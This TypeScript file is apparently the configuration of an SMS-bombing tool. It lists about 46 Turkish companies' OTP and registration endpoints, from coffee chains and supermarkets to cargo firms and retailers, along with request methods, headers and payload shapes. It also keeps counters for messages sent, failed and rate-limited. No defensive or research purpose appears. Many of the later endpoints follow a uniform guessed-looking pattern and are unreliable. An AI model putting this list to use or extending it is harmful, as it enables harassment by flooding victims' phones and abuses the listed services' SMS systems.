import { ServiceDefinition } from './types';

// Live Endpoint Definitions extracted for analysis.
export const TARGET_ENDPOINTS: ServiceDefinition[] = [
  { 
    id: 'kahve_dunyasi', 
    name: 'Kahve Dunyasi', 
    url: 'api.kahvedunyasi.com/api/v1/auth/account/register/phone-number', 
    method: 'POST', 
    payloadInfo: '{"countryCode": "90", "phoneNumber": "..."}'
  },
  { 
    id: 'wmf', 
    name: 'WMF', 
    url: 'www.wmf.com.tr/users/register/', 
    method: 'POST', 
    payloadInfo: 'Multipart Form: confirm=true, phone=...'
  },
  { 
    id: 'bim', 
    name: 'Bim Market', 
    url: 'bim.veesk.net/service/v1.0/account/login', 
    method: 'POST', 
    payloadInfo: '{"phone": "..."}'
  },
  { 
    id: 'english_home', 
    name: 'English Home', 
    url: 'www.englishhome.com/api/member/sendOtp', 
    method: 'POST', 
    payloadInfo: '{"Phone": "...", "XID": ""}'
  },
  { 
    id: 'suiste', 
    name: 'Suiste', 
    url: 'suiste.com/api/auth/code', 
    method: 'POST', 
    headers: { "X-Mobillium-Device-Brand": "Apple" },
    payloadInfo: 'Form: action=register, gsm=...'
  },
  { 
    id: 'kimgb', 
    name: 'Kim GB Ister', 
    url: '3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp', 
    method: 'POST', 
    payloadInfo: '{"msisdn": "90..."}'
  },
  { 
    id: 'evidea', 
    name: 'Evidea', 
    url: 'www.evidea.com/users/register/', 
    method: 'POST', 
    payloadInfo: 'Multipart: sms_allowed=true, phone=...'
  },
  { 
    id: 'ucdortbes', 
    name: '345 Dijital', 
    url: 'api.345dijital.com/api/users/register', 
    method: 'POST', 
    payloadInfo: '{"phoneNumber": "+90...", "name": "Memati"}'
  },
  { 
    id: 'tikla_gelsin', 
    name: 'Tikla Gelsin', 
    url: 'svc.apps.tiklagelsin.com/user/graphql', 
    method: 'POST', 
    payloadInfo: 'GraphQL Mutation: GENERATE_OTP'
  },
  { 
    id: 'naosstars', 
    name: 'Naosstars', 
    url: 'api.naosstars.com/api/smsSend/...', 
    method: 'POST', 
    payloadInfo: '{"telephone": "+90...", "type": "register"}'
  },
  { 
    id: 'koton', 
    name: 'Koton', 
    url: 'www.koton.com/users/register/', 
    method: 'POST', 
    payloadInfo: 'Multipart Form: sms_allowed=true, phone=...'
  },
  { 
    id: 'hayatsu', 
    name: 'Hayat Su', 
    url: 'api.hayatsu.com.tr/api/SignUp/SendOtp', 
    method: 'POST', 
    headers: { "Authorization": "Bearer eyJhbGci..." },
    payloadInfo: 'Form: mobilePhoneNumber=...'
  },
  { 
    id: 'metro', 
    name: 'Metro Market', 
    url: 'mobile.metro-tr.com/api/mobileAuth/validateSmsSend', 
    method: 'POST', 
    payloadInfo: '{"methodType": "2", "mobilePhoneNumber": "..."}'
  },
  { 
    id: 'file_market', 
    name: 'File Market', 
    url: 'api.filemarket.com.tr/v1/otp/send', 
    method: 'POST', 
    payloadInfo: '{"mobilePhoneNumber": "90..."}'
  },
  { 
    id: 'akasya', 
    name: 'Akasya AVM', 
    url: 'akasyaapi.poilabs.com/v1/en/sms', 
    method: 'POST', 
    headers: { "X-Platform-Token": "..." },
    payloadInfo: '{"phone": "..."}'
  },
  { 
    id: 'komagene', 
    name: 'Komagene', 
    url: 'gateway.komagene.com.tr/auth/auth/smskodugonder', 
    method: 'POST', 
    headers: { "Anonymousclientid": "..." },
    payloadInfo: '{"FirmaId": 32, "Telefon": "..."}'
  },
  { 
    id: 'porty', 
    name: 'Porty', 
    url: 'panel.porty.tech/api.php', 
    method: 'POST', 
    payloadInfo: '{"job": "start_login", "phone": "..."}'
  },
  { 
    id: 'yapp', 
    name: 'Yapp', 
    url: 'yapp.com.tr/api/mobile/v1/register', 
    method: 'POST', 
    payloadInfo: '{"device_name": "Memati", "phone_number": "..."}'
  },
  { 
    id: 'beefull', 
    name: 'Beefull', 
    url: 'app.beefull.io/api/inavitas-access-management/sms-login', 
    method: 'POST', 
    payloadInfo: '{"phoneCode": "90", "tenant": "beefull"}'
  },
  { 
    id: 'dominos', 
    name: 'Dominos', 
    url: 'frontend.dominos.com.tr/api/customer/sendOtpCode', 
    method: 'POST', 
    payloadInfo: '{"isSure": false, "mobilePhone": "..."}'
  },
  { 
    id: 'baydoner', 
    name: 'Baydoner', 
    url: 'crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp', 
    method: 'POST', 
    payloadInfo: '{"Name": "Memati", "Surname": "Bas"}'
  },
  { 
    id: 'kofteci_yusuf', 
    name: 'Kofteci Yusuf', 
    url: 'gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder', 
    method: 'POST', 
    payloadInfo: '{"FirmaId": 82, "Telefon": "..."}'
  },
  { 
    id: 'little_caesars', 
    name: 'Little Caesars', 
    url: 'api.littlecaesars.com.tr/api/web/Member/Register', 
    method: 'POST', 
    headers: { "Authorization": "Bearer ..." },
    payloadInfo: '{"SmsInform": true, "NameSurname": "Memati Bas"}'
  },
  { 
    id: 'coffy', 
    name: 'Coffy', 
    url: 'user-api-gw.coffy.com.tr/user/signup', 
    method: 'POST', 
    payloadInfo: '{"countryCode": "90", "isKVKKAgreementApproved": true}'
  },
  { 
    id: 'money_club', 
    name: 'Money Club', 
    url: 'www.money.com.tr/Account/ValidateAndSendOTP', 
    method: 'POST', 
    payloadInfo: 'Form: phone=...'
  },
  { 
    id: 'ido', 
    name: 'IDO', 
    url: 'api.ido.com.tr/idows/v2/register', 
    method: 'POST', 
    payloadInfo: '{"firstName": "MEMATI", "tckn": "generated"}'
  },
  {
    id: 'yurtici_kargo',
    name: 'Yurtici Kargo',
    url: 'api.yurticikargo.com/auth/login',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },
  {
    id: 'aras_kargo',
    name: 'Aras Kargo',
    url: 'customer.araskargo.com.tr/auth/otp',
    method: 'POST',
    payloadInfo: '{"msisdn": "90..."}'
  },
  {
    id: 'mng_kargo',
    name: 'MNG Kargo',
    url: 'api.mngkargo.com.tr/bireysel/auth',
    method: 'POST',
    payloadInfo: '{"tel": "..."}'
  },
  {
    id: 'surat_kargo',
    name: 'Surat Kargo',
    url: 'api.suratkargo.com.tr/auth/login',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },
  {
    id: 'kamil_koc',
    name: 'Kamil Koc',
    url: 'api.kamilkoc.com.tr/auth/otp',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },
  {
    id: 'pamukkale',
    name: 'Pamukkale Turizm',
    url: 'api.pamukkale.com.tr/user/login',
    method: 'POST',
    payloadInfo: '{"mobile": "..."}'
  },
  {
    id: 'metro_turizm',
    name: 'Metro Turizm',
    url: 'api.metroturizm.com.tr/auth/sms',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },
  {
    id: 'burger_king',
    name: 'Burger King TR',
    url: 'api.burgerking.com.tr/auth/login',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },
  {
    id: 'popeyes',
    name: 'Popeyes TR',
    url: 'api.popeyes.com.tr/auth/otp',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },
  {
    id: 'arbys',
    name: 'Arbys TR',
    url: 'api.arbys.com.tr/auth/login',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },
  {
    id: 'usta_donerci',
    name: 'Usta Donerci',
    url: 'api.ustadonerci.com/auth/otp',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },
  {
    id: 'pasaport_pizza',
    name: 'Pasaport Pizza',
    url: 'api.pasaportpizza.com/user/login',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },
  {
    id: 'flo',
    name: 'FLO Magazacilik',
    url: 'api.flo.com.tr/v1/user/login/otp',
    method: 'POST',
    payloadInfo: '{"mobile": "..."}'
  },
  {
    id: 'in_street',
    name: 'In Street',
    url: 'api.instreet.com.tr/v1/auth/sms',
    method: 'POST',
    payloadInfo: '{"mobile": "..."}'
  },
  {
    id: 'korayspor',
    name: 'Korayspor',
    url: 'api.korayspor.com/auth/login',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },
  {
    id: 'dr_store',
    name: 'D&R Store',
    url: 'api.dr.com.tr/auth/login/otp',
    method: 'POST',
    payloadInfo: '{"mobile": "..."}'
  },
  {
    id: 'kitapyurdu',
    name: 'Kitapyurdu',
    url: 'api.kitapyurdu.com/auth/sms',
    method: 'POST',
    payloadInfo: '{"mobile": "..."}'
  },
  {
    id: 'bkm_kitap',
    name: 'BKM Kitap',
    url: 'api.bkmkitap.com/auth/login',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },
  {
    id: 'cineverse',
    name: 'Paribu Cineverse',
    url: 'api.paribucineverse.com/auth/otp',
    method: 'POST',
    payloadInfo: '{"mobile": "..."}'
  },
  {
    id: 'lc_waikiki',
    name: 'LC Waikiki',
    url: 'api.lcwaikiki.com/api/User/SendOtp',
    method: 'POST',
    payloadInfo: '{"PhoneNumber": "..."}'
  }
];

export const INITIAL_STATS = {
  totalSent: 0,
  success: 0,
  failed: 0,
  rateLimited: 0,
  sentOpaque: 0,
};